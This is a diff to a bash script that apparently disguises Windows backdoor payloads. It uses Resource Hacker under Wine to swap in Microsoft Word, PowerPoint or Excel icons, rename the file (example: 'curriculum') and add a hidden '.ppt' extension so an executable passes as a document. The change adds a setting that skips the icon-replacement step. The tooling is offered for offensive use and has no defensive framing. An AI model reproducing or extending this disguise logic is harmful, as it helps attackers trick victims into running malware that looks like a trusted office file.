@@ -40,8 +40,9 @@ VeR="1.5"
 ArCh=`arch`
 IPATH=`pwd`
 HoME=`echo ~`
-# Use 2º name transformation method?
+# Read options in settings file..
 tRan=`cat $IPATH/settings | egrep -m 1 "BASH_TRANSFORMATION" | cut -d '=' -f2` > /dev/null 2>&1
+ByPa=`cat $IPATH/settings | egrep -m 1 "RESOURCEHACKER_BYPASS" | cut -d '=' -f2` > /dev/null 2>&1
 
 
 
@@ -140,19 +141,20 @@ echo ${BlueF}[☆]${white} Xterm installation   '->' ${GreenF}found! ${Reset};
 sleep 1
 fi
 
-if [ -e "$HoME/.wine/drive_c/$PgFi" ]; then
-echo ${BlueF}[☆]${white} Wine Program Files  '->' ${GreenF}found! ${Reset};
-sleep 1
-else
-echo ${RedF}[x]${white} Wine Program Files '->' ${RedF}not found! ${Reset};
-echo ${RedF}[x]${white} $HoME/.wine/drive_c/$PgFi ${Reset};
-sleep 1
-echo ${RedF}[x]${white} Please wait, running winecfg! ${Reset};
-winecfg > /dev/null 2>&1
-sleep 1
-exit
+if [ "$ByPa" = "NO" ]; then
+  if [ -e "$HoME/.wine/drive_c/$PgFi" ]; then
+    echo ${BlueF}[☆]${white} Wine Program Files  '->' ${GreenF}found! ${Reset};
+    sleep 1
+  else
+    echo ${RedF}[x]${white} Wine Program Files '->' ${RedF}not found! ${Reset};
+    echo ${RedF}[x]${white} $HoME/.wine/drive_c/$PgFi ${Reset};
+    sleep 1
+    echo ${RedF}[x]${white} Please wait, running winecfg! ${Reset};
+    winecfg > /dev/null 2>&1
+    sleep 1
+    exit
+  fi
 fi
-
 
 
 
@@ -166,13 +168,16 @@ if [ "$?" -eq "0" ]; then
 # orginal payload full-path variable
 UpL=$(zenity --title "☠ PAYLOAD TO BE TRANSFORMED ☠" --filename=$IPATH --file-selection --text "chose payload to be transformed") > /dev/null 2>&1
 # icon replacement variable
+if [ "$ByPa" = "NO" ]; then
 IcOn=$(zenity --list --title "☠ ICON REPLACEMENT  ☠" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "Microsoft-Word-2016.ico" FALSE "Microsost-Word-2013.ico" FALSE "Powerpoint-green.ico" FALSE "Powerpoint-blue.ico" FALSE "Powerpoint-orange.ico" FALSE "Microsoft-Excel.ico" --width 350 --height 290) > /dev/null 2>&1
+fi
 # input payload outputname
 if [ "$tRan" = "YES" ];then
 MiP=$(zenity --entry --title "☠ PAYLOAD FINAL NAME ☠" --text "example: curriculum" --width 300) > /dev/null 2>&1
 fi
 
 
+  if [ "$ByPa" = "NO" ]; then
   # wine configurtions (winecfg)
   echo ${BlueF}[☆]${white} Select [${YellowF}windows 7${white}] from winecfg... ${Reset};
 cat << !
@@ -213,6 +218,7 @@ cat << !
       $arch $HoME/.wine/drive_c/"$PgFi"/"Resource Hacker"/ResourceHacker.exe -open $UpL -save $IPATH/output/backdoor.exe -action addskip -res $IPATH/icons/$IcOn -mask ICONGROUP,MAINICON,
       echo ${BlueF}[☆]${white} Change backdoor agent icons '->' ${GreenF}done... ${Reset};
       sleep 1
+    fi
 
     # insert .ppt hidden extension
     echo ${BlueF}[☆]${white} Adding agent hidden extensions '->' ${GreenF}done... ${Reset};
